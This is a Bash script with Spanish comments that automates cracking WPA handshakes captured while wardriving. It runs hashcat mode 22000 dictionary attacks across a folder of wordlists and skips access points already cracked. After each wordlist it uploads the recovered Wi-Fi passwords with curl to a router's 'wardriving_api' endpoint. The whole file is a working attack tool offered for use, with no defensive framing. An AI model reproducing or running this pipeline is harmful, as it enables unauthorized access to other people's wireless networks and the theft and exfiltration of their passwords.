#!/bin/bash
HC2200_FILE=$1
ROUTER_IP=$2
ROUTER_TOKEN=$3
DICT_DIR=$4

HASHCAT_BIN="/root/hashcat-7.1.2/hashcat.bin"
POTFILE="/root/hashcat-7.1.2/hashcat.potfile"
PENDING_SYNC="/root/pending_sync.txt"

exec 9>/tmp/hashcat_queue.lock
flock 9

echo "[*] Iniciando procesamiento del archivo: $HC2200_FILE"

# Antiduplicados: derivar MACs ya crackeadas consultando el potfile (fuente de verdad)
# hashcat --show devuelve hc2200 completo con :password para los hashes ya crackeados
# Extraemos campo 4 (mac_ap en hex) de esas lineas WPA*
CRACKED_MACS_FILE="/tmp/cracked_macs_$$.txt"
$HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --show "$HC2200_FILE" 2>/dev/null \
    | awk -F'[*:]' '/^WPA[*]/ { print tolower($4) }' | sort -u > "$CRACKED_MACS_FILE"

# Quedarnos solo con hashes cuyas MACs de AP NO estan en el potfile todavia
if [ -s "$CRACKED_MACS_FILE" ]; then
    grep -vFf "$CRACKED_MACS_FILE" "$HC2200_FILE" > "/tmp/new_targets.hc2200" 2>/dev/null || true
else
    cp "$HC2200_FILE" "/tmp/new_targets.hc2200"
fi

if [ ! -s "/tmp/new_targets.hc2200" ]; then
    echo "[*] No hay hashes nuevos (todos ya estan en el potfile). Ignorando."
    rm -f "$HC2200_FILE" "/tmp/new_targets.hc2200" "$CRACKED_MACS_FILE"
    exec 9>&-
    exit 0
fi

NEW_COUNT=$(wc -l < "/tmp/new_targets.hc2200")
echo "[*] $NEW_COUNT hashes nuevos a procesar."

dicts=$(find "$DICT_DIR" -maxdepth 1 -type f 2>/dev/null | sort -V)

for dict in $dicts; do
    [ -f "$dict" ] || continue
    echo "[*] Probando diccionario: $(basename "$dict")"

    $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 -a 0 -w 3 \
        --status --status-timer=30 "/tmp/new_targets.hc2200" "$dict"

    # Sincronizar cracks al router
    $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --show "/tmp/new_targets.hc2200" \
        2>/dev/null > "/tmp/current_cracked.txt"

    if [ -s "/tmp/current_cracked.txt" ]; then
        cat "/tmp/current_cracked.txt" >> "$PENDING_SYNC"
        sort -u "$PENDING_SYNC" -o "$PENDING_SYNC" 2>/dev/null
    fi

    if [ -s "$PENDING_SYNC" ]; then
        TOTAL=$(wc -l < "$PENDING_SYNC")
        echo "[*] Sincronizando $TOTAL contrasenas..."
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: text/plain" \
            --data-binary @"$PENDING_SYNC" \
            "http://$ROUTER_IP/cgi-bin/wardriving_api?action=upload_potfile&token=$ROUTER_TOKEN" \
            --connect-timeout 10)
        if [ "$HTTP_CODE" = "200" ]; then
            echo "[+] Sincronizacion exitosa."
            rm -f "$PENDING_SYNC"
        fi
    fi

    # Continuar al siguiente dict solo si quedan hashes sin crackear
    $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --left "/tmp/new_targets.hc2200" \
        2>/dev/null > "/tmp/current_left.txt"
    if [ ! -s "/tmp/current_left.txt" ]; then
        echo "[*] No quedan hashes pendientes. Terminando."
        break
    fi
done

echo "[*] Proceso de cracking finalizado."
rm -f "$HC2200_FILE" "/tmp/new_targets.hc2200" "/tmp/current_cracked.txt" \
      "/tmp/current_left.txt" "$CRACKED_MACS_FILE"

exec 9>&-
